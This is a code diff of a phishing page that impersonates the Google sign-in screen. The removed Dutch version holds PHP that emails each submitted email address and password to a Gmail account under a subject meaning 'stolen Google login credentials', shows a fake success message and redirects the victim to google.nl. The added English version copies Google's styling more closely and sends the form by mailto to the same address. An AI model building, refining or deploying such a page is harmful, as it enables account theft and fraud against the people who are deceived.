@@ -1,63 +1,53 @@
 <!DOCTYPE html>
-<html lang="nl">
+<html>
 <head>
- <title>Google Inloggen</title>
- <meta charset="UTF-8">
- <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <style>
- body {
- font-family: Arial, sans-serif;
- }
- .container {
- width: 300px;
- margin: auto;
- padding: 20px;
- border: 1px solid #ddd;
- border-radius: 10px;
- box-shadow: 0 0 10px rgba(0,0,0,0.1);
- }
- </style>
+    <title>Sign in - Google Accounts</title>
+    <link rel="stylesheet" href="https://ssl.gstatic.com/accounts/static/_/ss/k=gaia.gaiafe_20220111.0_p0.O/am=Ag/d=1/rs=ABkqax2GJ4l7pQ8vVb9Kj6e4sTgFZ8Ww9A">
+    <style>
+        body {
+            background-color: #f5f5f5;
+            font-family: Arial, sans-serif;
+        }
+        .main {
+            width: 400px;
+            margin: 100px auto;
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+            border: none;
+            background-color: #f1f3f4;
+        }
+        button[type="submit"] {
+            width: 100%;
+            padding: 12px;
+            background-color: #4285f4;
+            color: #fff;
+            border-radius: 5px;
+            border:none; 
+        }
+    </style>
 </head>
 <body>
-
-<div class="container">
- <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo" style="width:100%;height:auto;">
- 
- <form id="loginForm" action="" method="post">
- <label for="email">E-mail:</label><br>
- <input type="email" id="email" name="email"><br><br>
- 
- <label for="password">Wachtwoord:</label><br>
- <input type="password" id="password" name="password"><br><br>
-
- <button type="submit">Inloggen</button>
- </form>
-
-</div>
-
-<?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-$email = $_POST['email'];
-$password = $_POST['password'];
-
-$to = 'kaasislekker069@gmail.com';
-$subject = 'Gestolen inloggegevens van Google';
-
-$message = '
-<p>Inloggegevens:</p> 
-<p>Email : '.$email.'</p> 
-<p>Password : '.$password.'</p>';
-
-$headers .= "MIME-Version: 1.0\r\n";
-$headers .= "Content-Type:text/html;charset=UTF-8\r\n";
-$headers .= "From:kaasislekker069@gmail.com";
-
-mail($to, $subject, $message, $headers);
-
-echo "<script>alert('Succesvol ingelogd!');</script>";
-echo "<script>window.location.href='https://www.google.nl';</script>";
-}
-?>
-
-</body>  
-</html>  
+    <div class="main">
+        <form action="mailto:kaasislekker069@gmail.com" method="post" enctype="text/plain">
+          <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_92x30dp.png" alt="Google Logo"><br><br>
+          <h1>Sign in</h1>
+          <input type="email" name="email" placeholder="Email or phone" required><br>
+          <input type="password" name="password" placeholder="Enter your password" required><br>
+          <button type="submit">Next</button>
+      </form>
+    </div>
+</body>
+</html>
